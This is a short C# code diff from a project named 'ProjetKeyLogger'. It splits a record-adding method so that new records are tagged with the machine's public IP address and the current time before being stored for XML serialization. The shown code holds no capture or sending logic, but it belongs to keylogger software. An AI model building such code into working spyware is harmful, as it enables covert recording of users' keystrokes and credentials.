@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Windows.Forms;
 using System.Xml.Serialization;
 
 namespace ProjetKeyLogger
@@ -31,8 +32,8 @@ namespace ProjetKeyLogger
             list_enregistrement = new List<Enregistrement>();
         }
 
-        //Ajoute un enregistrement a la collection
-        public void ajouter(Enregistrement enregistrement)
+        //Ajoute un enregistrement a la collection en initialisant la date et l'adresse
+        public void ajouterNew(Enregistrement enregistrement)
         {
             //On définit l'adresse ip publique
             enregistrement.adresseIpPublique();
@@ -40,6 +41,13 @@ namespace ProjetKeyLogger
             //mise a jour de la date
             enregistrement.dateTimeNow();
 
+            //On ajoute a la liste l'enregistrement courrant
+            list_enregistrement.Add(enregistrement);
+        }
+
+        //Ajoute un enregistrement a la collection
+        public void ajouter(Enregistrement enregistrement)
+        {
             //On ajoute a la liste l'enregistrement courrant
             list_enregistrement.Add(enregistrement);
         }
@@ -85,6 +93,8 @@ namespace ProjetKeyLogger
             file.Close();
             return collection_enregistrement;
         }
+
+  
 
 
     }
